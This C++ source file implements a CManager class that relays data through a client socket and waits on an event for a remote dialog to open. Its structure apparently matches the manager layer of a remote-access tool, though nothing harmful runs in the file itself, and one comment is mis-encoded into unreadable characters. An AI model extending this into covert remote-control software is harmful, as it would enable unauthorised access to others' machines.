// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Manager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CManager::CManager(CClientSocket *pClient)
{
	m_pClient = pClient;
	m_pClient->SetManagerCallBack(this);
	m_hEventDlgOpen = m_gFunc.CreateEvent(NULL, TRUE, FALSE, NULL);
}

CManager::~CManager()
{
	m_gFunc.CloseHandle(m_hEventDlgOpen);
}

void CManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

}

int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
 	try
 	{
		nRet = m_pClient->Send((LPBYTE)lpData, nSize);
	}catch(...){};
	return nRet;
}
typedef DWORD (WINAPI *WaitForSingleObjectT)
(
	__in HANDLE hHandle,
	__in DWORD dwMilliseconds
);
void CManager::WaitForDialogOpen()
{

	m_gFunc.WaitForSingleObject(m_hEventDlgOpen, INFINITE);
	// �����Sleep,��ΪԶ�̴��ڴ�InitDialog�з���COMMAND_NEXT����ʾ��Ҫһ��ʱ��
	m_gFunc.Sleep(150);
}

void CManager::NotifyDialogIsOpen()
{
	m_gFunc.SetEvent(m_hEventDlgOpen);
}